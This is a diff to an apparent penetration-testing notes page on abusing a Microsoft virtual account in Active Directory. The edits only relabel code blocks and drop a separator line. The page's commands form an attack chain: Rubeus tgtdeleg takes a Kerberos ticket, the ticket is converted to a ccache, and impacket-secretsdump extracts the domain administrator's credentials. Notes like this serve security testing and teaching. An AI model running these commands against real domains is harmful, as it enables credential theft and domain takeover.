@@ -4,7 +4,6 @@ date: 2024-8-1
 tags: ["machine account", "Microsoft virtual account", "active directory", "ad", "domain controller", "Windows", "rubeus", "kerberos"]
 ---
 
----
 ### Abuse #1: Microsoft virtual account
 
 #### 1. Create a ticket from Microsoft virtual account
@@ -14,7 +13,7 @@ tags: ["machine account", "Microsoft virtual account", "active directory", "ad",
 
 <div>
 
-```powershell
+```console
 .\rubeus.exe tgtdeleg /nowrap /ptt
 ```
 
@@ -32,7 +31,7 @@ tags: ["machine account", "Microsoft virtual account", "active directory", "ad",
 
 <div>
 
-```bash
+```console
 python3 rubeustoccache.py <BASE64_TICKET> secrets.kirbi secrets.ccache
 ```
 
@@ -42,11 +41,11 @@ python3 rubeustoccache.py <BASE64_TICKET> secrets.kirbi secrets.ccache
 
 <div>
 
-```bash
+```console
 export KRB5CCNAME=secrets.ccache
 ```
 
-```bash
+```console
 sudo ntpdate -s <DC> && impacket-secretsdump -k -no-pass -just-dc-user administrator
 ```
 
